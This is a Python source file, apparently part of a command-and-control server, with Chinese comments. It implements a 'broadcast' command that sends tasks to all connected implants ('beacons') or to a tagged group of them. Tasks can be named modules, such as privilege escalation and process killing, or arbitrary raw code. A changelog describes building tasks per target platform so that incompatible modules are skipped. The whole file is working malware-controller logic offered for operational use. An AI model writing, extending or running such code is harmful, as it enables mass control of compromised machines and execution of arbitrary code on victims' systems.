"""broadcast — 批量下发: broadcast [@组名] <module|raw> [args...]
以 @ 开头为组名过滤（tag 命令打的标签）。

2026-09-28:改为**按每个 beacon 各自的平台单独构造任务**(build_task_for)。
此前一次性用 platform="" 构建一个任务再复制给所有人 —— 平台白名单被放行,
Linux-only 模块(priv_esc/netinfo/proc_kill/icmp_probe 等)会被下发给 Windows
beacon,直到植入物运行期才失败。现在逐台构造:平台不支持的当场跳过,并在回执
里点名是哪几台、为什么跳过。

raw 与平台无关,仍按原文下发。
"""

from server.task_queue import Task


def run(disp, args):
    if not args:
        return "[!] usage: broadcast [@组名] <module|raw> [args...]"

    group = ""
    if args[0].startswith("@"):
        group = args[0][1:]
        args = args[1:]
        if not args:
            return "[!] usage: broadcast @组名 <module|raw> [args...]"

    beacons = [c for c in disp.mgr.list_clients() if not c.is_client]
    if group:
        beacons = [c for c in beacons if group in getattr(c, "tags", [])]
        if not beacons:
            return f"[!] 组 {group} 没有 beacon（先 tag <bid> {group}）"
    if not beacons:
        return "(no beacons connected)"

    is_raw = args[0].lower() == "raw"
    if is_raw:
        code = " ".join(args[1:])
        if not code:
            return "[!] usage: broadcast raw <code>"
        mod_name = ""
    else:
        mod_name = args[0]
        # 模块不存在就没必要逐台报错,先挡掉
        if not disp.modules.get_module(mod_name):
            return f"[!] unknown module: {mod_name}"

    count = 0
    skipped = []
    for c in beacons:
        cid = str(getattr(c, "client_id", "") or "")
        if is_raw:
            task = Task(code=code)
        else:
            try:
                task = disp.build_task_for(cid, mod_name, args[1:])
            except ValueError as exc:
                skipped.append(f"{cid[:8]}({exc})")
                continue
            if task is None:
                skipped.append(f"{cid[:8]}(unknown module)")
                continue
        if disp.tq.push(cid, task):
            count += 1
        else:
            skipped.append(f"{cid[:8]}(队列已满)")

    msg = f"[+] 已向 {count}/{len(beacons)} 个 Beacon 下发任务"
    if skipped:
        shown = "; ".join(skipped[:4])
        tail = f" …共 {len(skipped)} 台" if len(skipped) > 4 else ""
        msg += f"(跳过 {len(skipped)} 台: {shown}{tail})"
    return msg
